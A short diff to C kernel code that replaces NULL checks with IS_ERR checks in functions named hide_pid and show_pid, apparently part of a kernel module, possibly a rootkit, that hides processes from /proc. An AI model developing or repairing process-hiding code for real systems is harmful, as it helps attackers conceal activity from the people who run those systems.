@@ -194,7 +194,7 @@ void hide_pid(unsigned int tgid)
     if (!node)
         return;
     struct file *f = filp_open("/proc", O_RDONLY, 0);
-    if (!f) {
+    if (IS_ERR(f)) {
         vfree(node);
         return;
     }
@@ -212,7 +212,7 @@ void show_pid(unsigned int tgid)
 {
     struct struct_list *node, *safe;
     struct file *f = filp_open("/proc", O_RDONLY, 0);
-    if (!f)
+    if (IS_ERR(f))
         return;
     struct pid_namespace *ns = proc_pid_ns(file_inode(f)->i_sb);
     filp_close(f, 0);
